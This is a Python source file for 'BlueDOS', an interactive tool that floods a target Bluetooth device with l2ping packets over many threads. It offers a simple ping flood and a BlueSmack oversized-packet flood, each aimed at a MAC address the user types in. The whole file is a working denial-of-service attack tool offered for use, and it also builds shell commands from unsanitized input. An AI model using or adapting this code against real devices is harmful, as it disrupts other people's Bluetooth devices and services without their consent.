import threading
import subprocess
from colorama import init, Fore
import os


class BlueDOS():
    def __init__(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}Run the script as root privileges.")
            return
        self.mainMenu()

    def printBanner(self):
        os.system("clear")

        init(autoreset=True)

        banner = f"""
██████  ██      ██    ██ ███████ ██████   ██████  ███████     
██   ██ ██      ██    ██ ██      ██   ██ ██    ██ ██          
██████  ██      ██    ██ █████   ██   ██ ██    ██ ███████     
██   ██ ██      ██    ██ ██      ██   ██ ██    ██      ██     
██████  ███████  ██████  ███████ ██████   ██████  ███████\n\n{Fore.LIGHTRED_EX}by st4inl3s5
        """

        print(Fore.RED + banner)

    def makePingFlood(self, packetNumber, targetMacAddress):
        subprocess.call([f"l2ping -i hci0 -s {packetNumber} -f {targetMacAddress} > /dev/null"], shell=True)

    def simplePingFlood(self):
        self.printBanner()
        print("\n" + Fore.LIGHTGREEN_EX + "Bluetooth Simple Ping Flood\n\nEnter the MAC Address of target")
        targetMacAddress = input(f"\n\n{Fore.MAGENTA}user@bluedos[simple_ping_flood]$")
        print("\n\n" + Fore.LIGHTGREEN_EX + "Enter the thread number")
        threadNumber = int(input(f"\n\n{Fore.MAGENTA}user@bluedos[simple_ping_flood]$"))
        activeThreads = []
        for i in range(threadNumber):
            thread = threading.Thread(target=self.makePingFlood, args=(50, targetMacAddress))
            thread.start()
            activeThreads.append(thread)
            print(Fore.CYAN + f"Thread {i} started...")
        
        print(Fore.RED + "\nPress any key for stop the attack.")
        input()
        exit()

    def bluesmackPingFlood(self):
        self.printBanner()
        print("\n" + Fore.LIGHTGREEN_EX + "Bluetooth BlueSmack Ping Flood\n\nEnter the MAC Address of target")
        targetMacAddress = input(f"\n\n{Fore.MAGENTA}user@bluedos[bluesmack_ping_flood]$")
        print("\n\n" + Fore.LIGHTGREEN_EX + "Enter the thread number")
        threadNumber = int(input(f"\n\n{Fore.MAGENTA}user@bluedos[bluesmack_ping_flood]$"))
        activeThreads = []
        for i in range(threadNumber):
            thread = threading.Thread(target=self.makePingFlood, args=(668, targetMacAddress))
            thread.start()
            activeThreads.append(thread)
            print(Fore.CYAN + f"Thread {i} started...")
        
        print(Fore.RED + "\nPress any key for stop the attack.")
        input()
        for thread in activeThreads:
            thread.join()


    def mainMenu(self):
        while True:
            try:
                self.printBanner()
                print("\n" + Fore.LIGHTGREEN_EX + "Bluetooth DOS attacks menu")
                print(Fore.GREEN + "\n1.Simple Ping Flood\n2.BlueSmack Large Packet Flood\n3.Exit\n\n")
                choice = input(f"{Fore.MAGENTA}user@bluedos[~]${Fore.LIGHTMAGENTA_EX}")
                if choice == "1":
                    self.simplePingFlood()
                elif choice == "2":
                    self.bluesmackPingFlood()
                else:
                    break
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}Keyboard interrupt detected.Exiting...")
                break

BlueDOS()
